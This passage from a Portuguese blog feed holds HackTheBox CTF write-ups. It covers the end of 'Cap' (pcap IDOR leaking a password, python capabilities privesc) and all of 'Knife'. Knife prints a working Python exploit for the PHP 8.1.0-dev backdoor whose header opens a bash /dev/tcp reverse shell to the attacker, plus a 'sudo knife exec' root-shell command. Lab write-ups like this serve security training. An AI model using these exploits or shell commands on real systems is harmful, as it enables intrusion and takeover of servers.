<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 28 13:35:46 2021 as: nmap -v -sV -sC -p 21,22,80 -Pn -oN details.txt 10.10.10.245</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.245
Host is up <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d🇩🇪b3🇩🇪b2:18 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 <span style="color:#ae81ff">404</span> NOT FOUND
|     Server: gunicorn
|     Date: Mon, <span style="color:#ae81ff">28</span> Jun <span style="color:#ae81ff">2021</span> 16:48:27 GMT
|     Connection: close
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
|     Content-Length: <span style="color:#ae81ff">232</span>
|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
|     Server: gunicorn
|     Date: Mon, <span style="color:#ae81ff">28</span> Jun <span style="color:#ae81ff">2021</span> 16:48:19 GMT
|     Connection: close
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
|     Content-Length: <span style="color:#ae81ff">19386</span>
|     &lt;!DOCTYPE html&gt;
|     &lt;html class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-js&#34;</span> lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
|     &lt;head&gt;
|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-ua-compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ie=edge&#34;</span>&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shortcut icon&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;image/png&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/themify-icons.css&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/metisMenu.css&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/css/slicknav.min.css&#34;</span>&gt;
|     &lt;!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
|     Server: gunicorn
|     Date: Mon, <span style="color:#ae81ff">28</span> Jun <span style="color:#ae81ff">2021</span> 16:48:19 GMT
|     Connection: close
|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: <span style="color:#ae81ff">0</span>
|   RTSPRequest: 
|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: <span style="color:#ae81ff">196</span>
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;<span style="color:#75715e">#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span>
|     &lt;/body&gt;
|_    &lt;/html&gt;
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn
|_http-title: Security Dashboard
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/28%Time<span style="color:#f92672">=</span>60D9FA6A%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>GetR
SF:equest,2A94,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
</span><span style="color:#e6db74">SF:Mon,\x2028\x20Jun\x202021\x2016:48:19\x20GMT\r\nConnection:\x20close\r\
</span><span style="color:#e6db74">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
</span><span style="color:#e6db74">SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&#34;no-js\&#34;\x20lang=\&#34;en\&#34;&gt;\
</span><span style="color:#e6db74">SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x2
</span><span style="color:#e6db74">SF:0&lt;meta\x20http-equiv=\&#34;x-ua-compatible\&#34;\x20content=\&#34;ie=edge\&#34;&gt;\n\x20\
</span><span style="color:#e6db74">SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
</span><span style="color:#e6db74">SF:x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=
</span><span style="color:#e6db74">SF:1\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;shortcut\x20icon\&#34;\x20type=\&#34;image
</span><span style="color:#e6db74">SF:/png\&#34;\x20href=\&#34;/static/images/icon/favicon\.ico\&#34;&gt;\n\x20\x20\x20\x20&lt;
</span><span style="color:#e6db74">SF:link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/bootstrap\.min\.css\&#34;&gt;
</span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/fon
</span><span style="color:#e6db74">SF:t-awesome\.min\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20
</span><span style="color:#e6db74">SF:href=\&#34;/static/css/themify-icons\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
</span><span style="color:#e6db74">SF:\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/metisMenu\.css\&#34;&gt;\n\x20\x20\x20\x2
</span><span style="color:#e6db74">SF:0&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/css/owl\.carousel\.min\.
</span><span style="color:#e6db74">SF:css\&#34;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;/static/c
</span><span style="color:#e6db74">SF:ss/slicknav\.min\.css\&#34;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOption
SF:s,B3,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Mon,\x2
</span><span style="color:#e6db74">SF:028\x20Jun\x202021\x2016:48:19\x20GMT\r\nConnection:\x20close\r\nConten
</span><span style="color:#e6db74">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x2
</span><span style="color:#e6db74">SF:0HEAD\r\nContent-Length:\x200\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,121,<span style="color:#e6db74">&#34;HTTP/1\.1\x2
</span><span style="color:#e6db74">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
</span><span style="color:#e6db74">SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
</span><span style="color:#e6db74">SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
</span><span style="color:#e6db74">SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
</span><span style="color:#e6db74">SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
</span><span style="color:#e6db74">SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,189
SF:,<span style="color:#e6db74">&#34;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20M
</span><span style="color:#e6db74">SF:on,\x2028\x20Jun\x202021\x2016:48:27\x20GMT\r\nConnection:\x20close\r\n
</span><span style="color:#e6db74">SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
</span><span style="color:#e6db74">SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x203\.2\x20
</span><span style="color:#e6db74">SF:Final//EN\&#34;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
</span><span style="color:#e6db74">SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
</span><span style="color:#e6db74">SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
</span><span style="color:#e6db74">SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&#34;</span><span style="color:#f92672">)</span>;
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Mon Jun 28 13:38:30 2021 -- 1 IP address (1 host up) scanned in 164.00 seconds</span>
</code></pre></div><h3 id="webserver">Webserver</h3>
<p>Acessando a aplicação web na porta 80 é mostrado um &lsquo;dashboard&rsquo; com o nome de um usuário no canto superior direito.</p>

    <img src="https://i.imgur.com/4JXFQ7T.png"  alt="Dashboard"  class="center"  style="border-radius: 8px;"  />


<p>No menú sidebar três opções podem ser selecionadas e em cada uma é mostrada a saída de um comando executado no server: O &lsquo;Ipconfig&rsquo;, o &lsquo;Network Status&rsquo; (Netstat) e o &lsquo;Security Snapshots&rsquo; (comando que gera um arquivo .pcap, contendo todo o tráfego entre o usuário e o host).</p>

    <img src="https://i.imgur.com/4JXFQ7T.png"  alt="Dashboard"  class="center"  style="border-radius: 8px;"  />


<p>Na URL de download do arquivo .pcap percebe-se que o parâmetro passado é &lsquo;1&rsquo;.</p>

    <img src="https://i.imgur.com/jL3FIhX.png"  alt="Download pcap"  class="center"  style="border-radius: 8px;"  />


<h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>O conteúdo do arquivo 1.pcap é apenas o tráfego da máquina local com o host. Ao tentar com 2, 3, 4 e 5 outros pcaps puderam ser baixados, mas com o tráfego de outros usuários do HackTheBox que estavam acessando o host. Ao colocar na URL o 0 (zero) o &lsquo;0.pcap&rsquo; também estava disponível, mas agora contendo o tráfego interno. Ao abrir o arquivo e analisá-lo pelo Wireshark foi possível encontrar a senha <strong>Buck3tH4TF0RM3!</strong> do usuário <strong>nathan</strong>.</p>

    <img src="https://i.imgur.com/0JYSrCk.png"  alt="Wireshark password"  class="center"  style="border-radius: 8px;"  />


<p>Detalhes do &lsquo;TCP Stream&rsquo;.</p>

    <img src="https://i.imgur.com/tW6bVrW.png"  alt="Credenciais FTP"  class="center"  style="border-radius: 8px;"  />


<h2 id="exploração">Exploração</h2>
<p>Com estas credenciais foi possível acessar o host via FTP e obter a flag do usuário no arquivo user.txt.</p>

    <img src="https://i.imgur.com/pj6Agms.png"  alt="Login FTP"  class="center"  style="border-radius: 8px;"  />


<p>A mesma credencial permite o acesso ao host via SSH.</p>

    <img src="https://i.imgur.com/qK1pH9h.png"  alt="Login SSH"  class="center"  style="border-radius: 8px;"  />


<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>O usuário nathan não possui permissões com o sudo, o que impede obter privilégios de root em algum script ou binário.</p>

    <img src="https://i.imgur.com/JOL1vBe.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />


<p>Para obter mais informações sobre o host, configurações e permissões foi executado o script <strong>linpeas.sh</strong>. O resultado mostrou que o o Python3 possui uma configuração de permissões (Capabilities) que o deixa vulnerável a escalação de privilégios. As Capabilities são usadas ​​para permitir que binários (executados por usuários não root) realizem ações privilegiadas sem fornecer a eles todas as permissões de root.</p>

    <img src="https://i.imgur.com/gRzAbXC.png"  alt="Python capabilities"  class="center"  style="border-radius: 8px;"  />


<p>Consultando o site <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">HackTricks</a> e <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">GTFobins</a> podemos encontrar a forma de escalar privilégios pelo Python e obter a shell do root.</p>

    <img src="https://i.imgur.com/MPkiR0X.png"  alt="GTFobins capabilities"  class="center"  style="border-radius: 8px;"  />


<p>Pelo próprio terminal também é possível listar as capabilities de um usuário, com o comando <strong>getcap</strong>. Na primeira linha aparece o python3.8.</p>

    <img src="https://i.imgur.com/88YCUe0.png"  alt="Comando getcap"  class="center"  style="border-radius: 8px;"  />


<p>Executando o comando sugerido pelo GTFogins para obter shell de root.</p>

    <img src="https://i.imgur.com/nQCmsHB.png"  alt="Shell root"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do usuário root.</p>

    <img src="https://i.imgur.com/T0aKTkj.png"  alt="Flag root"  class="center"  style="border-radius: 8px;"  />


<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Knife</title>
            <link>https://brunomcuesta.github.io/posts/2021/08/hackthebox-knife/</link>
            <pubDate>Sat, 28 Aug 2021 14:21:00 -0300</pubDate>
            
            <guid>https://brunomcuesta.github.io/posts/2021/08/hackthebox-knife/</guid>
            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Knife&amp;rsquo; do HackTheBox.
Informações da Máquina IP: 10.10.10.242
Sistema Operacional: Linux
Nível de dificuldade: Easy
Varredura e Enumeração Port Scan Duas portas abertas foram descobertas com o Nmap: 22 e 80. Abaixo o resultado do Nmap executando o scan com os scripts padrão.
# Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details.</description>
            <content type="html"><![CDATA[
    <img src="https://i.imgur.com/x3iE4nH.jpg"  alt="Knife Cover"  class="center"  style="border-radius: 8px;"  />


<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Knife&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
<h2 id="informações-da-máquina">Informações da Máquina</h2>
<p>IP: 10.10.10.242</p>
<p>Sistema Operacional: Linux</p>
<p>Nível de dificuldade: Easy</p>
<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
<h3 id="port-scan">Port Scan</h3>
<p>Duas portas abertas foram descobertas com o Nmap: 22 e 80.
Abaixo o resultado do Nmap executando o scan com os scripts padrão.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details.txt 10.10.10.242</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.242
Host is up <span style="color:#f92672">(</span>0.26s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e🆎22:0e:c0:ee <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 1a🇩🇪a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Mon Jun 21 18:20:41 2021 -- 1 IP address (1 host up) scanned in 22.53 seconds</span>
</code></pre></div><h3 id="webserver">Webserver</h3>
<p>O resultado do comando Nmap mostra a porta 80 aberta e ao acessar o ip da máquina é possível visualizar uma página html.</p>

    <img src="https://i.imgur.com/gKGRBIR.png"  alt="Página Inicial"  class="center"  style="border-radius: 8px;"  />


<p>Para acessar o site pelo seu domínio e não pelo seu ip basta inserir a linha correspondente ao arquivo /etc/hosts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.242  knife.htb
</code></pre></div><p>O site poderá ser acessado pela seguinte URL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://knife.htb
</code></pre></div><p>Ao examinar o código fonte da página nada foi encontrado. A enumeração de diretórios e arquivos também não mostrou nada relevante exposto pelo servidor, além da página principal. Isto indica que a vulnerabilidade pode estar em alguma tecnologia presente que não foi atualizada. Neste caso é necessário verificar a versão do que está sendo utilizado no host. Para esta tarefa foi utilizado o &lsquo;whatweb&rsquo;.</p>

    <img src="https://i.imgur.com/UJ13k90.png"  alt="Whatweb"  class="center"  style="border-radius: 8px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.242 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.41<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>,
HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>,
IP<span style="color:#f92672">[</span>10.10.10.242<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>8.1.0-dev<span style="color:#f92672">]</span>, Script,
Title<span style="color:#f92672">[</span>Emergent Medical Idea<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/8.1.0-dev<span style="color:#f92672">]</span>

</code></pre></div><p>A saída do comando mostra que o servidor roda um Apache/2.4.41 e a linguagem de programação utilizada é o PHP 8.1.0-dev.</p>
<h2 id="vulnerabilidade">Vulnerabilidade</h2>
<p>Buscando por vulnerabilidade nesta versão de PHP foi possível encontrar um exploit disponível no <a href="https://www.exploit-db.com/exploits/49933">ExploitDB</a>.</p>

    <img src="https://i.imgur.com/XTP24m5.png"  alt="Whatweb"  class="center"  style="border-radius: 8px;"  />


<h2 id="exploração">Exploração</h2>
<p>O exploit consiste em um script python que envia um &lsquo;User-Agentt&rsquo; alterado, permitindo a execução de um RCE (Remote Code Execution) no host. Com o exploit é possível obter um shell interativo.</p>

    <img src="https://i.imgur.com/0B8JQJQ.png"  alt="Exploit"  class="center"  style="border-radius: 8px;"  />


<p>Listando o diretório &lsquo;home&rsquo; do usuário james:</p>

    <img src="https://i.imgur.com/aGDKFF9.png"  alt="Home"  class="center"  style="border-radius: 8px;"  />


<p>Apesar de ser útil para obter mais informações do host e inclusive a &lsquo;flag&rsquo; do user.txt na &lsquo;home&rsquo; do usuário james, a alteração do script para obter um &lsquo;reverse shell&rsquo; é o ideal. A linha do &ldquo;User-Agentt&rdquo; foi alterada, removendo o &ldquo;cmd&rdquo; como payload e colocando em seu lugar uma conexão reversa em bash passando como parâmetro o ip e porta da máquina local do atacante.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> re
<span style="color:#f92672">import</span> requests

host <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter the full host url (http://host/): &#34;</span>)
ip <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Local IP: &#34;</span>)
port <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Local Port: &#34;</span>)
request <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
response <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(host)

<span style="color:#66d9ef">if</span> str(response) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;Response [200]&gt;&#39;</span>:
    <span style="color:#66d9ef">try</span>:
        headers <span style="color:#f92672">=</span> {
        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>,
        <span style="color:#e6db74">&#34;User-Agentt&#34;</span>: <span style="color:#e6db74">&#34;zerodiumsystem(&#39;/bin/bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp;/dev/tcp/{}/{} 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39;);&#34;</span><span style="color:#f92672">.</span>format(ip,port)
        }
        response <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(host, headers <span style="color:#f92672">=</span> headers, allow_redirects <span style="color:#f92672">=</span> False)
    <span style="color:#66d9ef">except</span> (<span style="color:#a6e22e">KeyboardInterrupt</span>):
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Exiting...&#34;</span>)
        exit

<span style="color:#66d9ef">else</span>:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
    <span style="color:#66d9ef">print</span>(response)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Host is not available, aborting...&#34;</span>)
    exit
</code></pre></div><p>Após executar o script informando o ip do host e o ip e porta da máquina local obtemos um &lsquo;reverse shell&rsquo;.</p>

    <img src="https://i.imgur.com/UOKMFPe.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do user.txt:</p>

    <img src="https://i.imgur.com/0hLN4jy.png"  alt="James flag"  class="center"  style="border-radius: 8px;"  />


<p>Enumerando internamente o diretório /var/www/html apenas uma página index.html foi encontrada. Porém no diretório /opt podemos encontrar outros dois diretórios que pertencem a um software de terceiros (chef-workstation e opscode). Inclusive na &lsquo;home&rsquo; do usuário é possível verificar a existência do diretório oculto &ldquo;.chef&rdquo; com um arquivo &ldquo;credentials&rdquo;.</p>

    <img src="https://i.imgur.com/uuTctBo.png"  alt="Chef"  class="center"  style="border-radius: 8px;"  />


<p>Buscando por &lsquo;chef&rsquo; encontramos mais informações sobre este software na página do <a href="https://docs.chef.io/platform_overview/">desenvolvedor</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Chef é uma empresa de automação. Desde sua fundação em 2008, reunimos
desenvolvedores e administradores de sistema com nosso produto homônimo, Chef Infra.
Com o passar dos anos, o que entendemos por automação se expandiu.
Hoje, o Chef tem uma solução de automação completa para infraestrutura
e aplicativos que o leva desde o desenvolvimento até a produção.
</code></pre></div><p>Como se trata de um software de automação o mais provável é que o usuário james possa executar algum binário ou script com permissões de root e assim será possível escalar privilégio na máquina.</p>
<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
<p>O primeiro passo é saber se o usuário james está incluído no &lsquo;sudoers&rsquo; e se possui alguma permissão específica para executar algum script ou binário.</p>

    <img src="https://i.imgur.com/ARoPIT2.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />


<p>A saída do comando mostra que o arquivo /usr/bin/knife pode ser executado pelo usuário james com permissão de root e sem a necessidade de informar a senha do usuário.</p>
<p>Com o comando &lsquo;file&rsquo; descobrimos que o arquivo &lsquo;knife&rsquo; é na realidade um link simbólico para outro de mesmo nome dentro do diretório &lsquo;chef-workstation&rsquo;.</p>

    <img src="https://i.imgur.com/EeHp6TH.png"  alt="File"  class="center"  style="border-radius: 8px;"  />


<p>Portanto, o &lsquo;knife&rsquo; é um utilitário de automação do &lsquo;chef-workstation&rsquo; e para descobrir como usá-lo para escalar privilégio é necessário pesquisar no site do <a href="https://docs.chef.io/workstation/knife/">desenvolvedor</a>.</p>

    <img src="https://i.imgur.com/5oJoPve.png"  alt="Knife"  class="center"  style="border-radius: 8px;"  />


<p>O parâmetro que permite a execução de scripts ruby ou algum comando do sistema é o <a href="https://docs.chef.io/workstation/knife_exec/">exec</a>.</p>

    <img src="https://i.imgur.com/mbyGj3I.png"  alt="Knife Exec"  class="center"  style="border-radius: 8px;"  />


<p>Pode ser visualizado também ao executar o arquivo e buscar no seu menú de opções:</p>

    <img src="https://i.imgur.com/XYe0CVe.png"  alt="Knife Menú"  class="center"  style="border-radius: 8px;"  />


<p>Este é o comando utilizado para obter root:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo knife exec --exec <span style="color:#e6db74">&#34;exec &#39;/bin/bash -i&#39;&#34;</span>
</code></pre></div>
    <img src="https://i.imgur.com/0bj2R32.png"  alt="Root"  class="center"  style="border-radius: 8px;"  />


<p>Obtendo a flag do root:</p>

    <img src="https://i.imgur.com/RIrn163.png"  alt="Root Flag"  class="center"  style="border-radius: 8px;"  />


<p>Neste &lsquo;writeup&rsquo; foi demonstrado como invadir a máquina &lsquo;knife&rsquo; através da exploração de um software desatualizado (PHP) no servidor. Logo em seguida, com uma enumeração básica na máquina, foi descoberto que o usuário &lsquo;james&rsquo; pode executar um script (knife) com permissões de root, bastando que o &lsquo;script&rsquo; seja executado com o &lsquo;sudo&rsquo; e sem o uso de senha do usuário, o que é considerado uma falha de segurança.</p>
<p>Até a próxima!</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox - Love</title>
